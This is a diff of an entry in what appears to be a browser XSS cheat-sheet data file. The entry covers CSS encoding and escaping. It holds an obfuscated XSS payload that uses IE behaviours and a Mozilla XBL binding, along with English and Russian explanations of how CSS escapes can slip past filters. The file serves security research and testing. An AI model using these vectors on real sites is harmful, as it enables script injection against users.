@@ -1846,16 +1846,16 @@ var items =
         'tags'       : ['trick', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer', 'chrome', 'safari', 'fuzzing'],
         'reporter'   : 'Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sirdarckcat'
     },
-    { /* ID 61 - CSS-encoding and backslashing */
+    { /* ID 61 - CSS-encoding and escaping */
         'id'         : 61,
         'category'   : 'css', 
         'name'       : {
-            'en' : 'CSS-encoding and backslashing',
+            'en' : 'CSS-encoding and escaping',
             'ja' : '',
             'ru' : 'CSS-кодирование и добавление обратного слеша',
             'de' : ''
         },
-        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
+        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\&#xA0\\000061 vio\\r:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E din\\g:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-s\\ource:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '0',            
@@ -1864,9 +1864,9 @@ var items =
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
         },
         'description': {
-            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (note: in CSS-strings \\x = x, but  \\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). Properties in IE may contain encoded null-character (\\0). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation (for example, change case of characters).',
+            'en' : '[a] Encoding.\n\nThere are only three tricks to encode characters.\n[1] You can change the number of zeros: \\0A -> \\00000A \n[2] You can change the capital letter: \\0A -> \\0a \n[3] You can change the whitespace* accepted as delimiters after the encoded character.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,32\nFirefox, Google Chrome, Internet Explorer, Safari: 13\nInternet Explorer: 11,160,8192-8203,12288,65279\n\nProperties in IE may contain encoded null-character (\\0).\nThe volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation.\n\n[b] Escaping.\n\nIn addition, you can put a backslash before the character. Note: in CSS-strings \\x == x, but \\n != n\nIn FF You can put a backslash before the newline-characters: co\\&#x0Dl\\&#x0Aor:r\\&#xD&#xA;ed \nOption of writing a null-character in Internet Explorer is escaping of any whitespace-character accepted as delimiters: col\\&#160or:red \n\nOf course, these methods can be combined with other encoding and obfuscation (for example, change case of original characters).\n\n* These are given in decimal codes.',
             'ja' : '',
-            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (внимание: в css-строках \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. В IE свойства могут содержать кодированный нулевой символ (\\0). Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией (например, с изменением регистра символов).',
+            'ru' : '[a] Кодирование.\n\nСуществуют всего три приёма, которые можно использовать при CSS-кодировании.\n[1] Вы можете изменять число нулей: \\0A -> \\00000A \n [2] Вы можете менять регистр символов: \\0A -> \\0a \n [3] Вы можете менять пробельный символ*, рассматриваемый в качестве разделителя, после закодированного символа.\n\nFirefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,32\nFirefox, Google Chrome, Internet Explorer, Safari: 13\nInternet Explorer: 11,160,8192-8203,12288,65279\n\n Свойства в IE могут содержать закодированный нулевой символ (\\0).\nВажно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации.\n\n[b] Эскейпинг.\n\nКроме того, вы можете добавлять перед символами обратные слеши. Внимание: в CSS-строках \\x == x, но \\n != n \n В FF вы можете эскейпировать символы перевода строки и/или возврата каретки: co\\&#x0Dl\\&#x0Aor:r\\&#xD&#xA;ed \n Эскейпирование любого пробельного символа, рассматриваемого в качестве разделителя при CSS-кодировании, является вариантом написания нулевого символа для IE : col\\&#160or:red \n\nРазумеется, можно сочетать эти приемы с другим кодированием и обфускацией (например, с изменением регистра первоначальных символов).\n\n* Ниже они приведены в десятичных кодах.',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
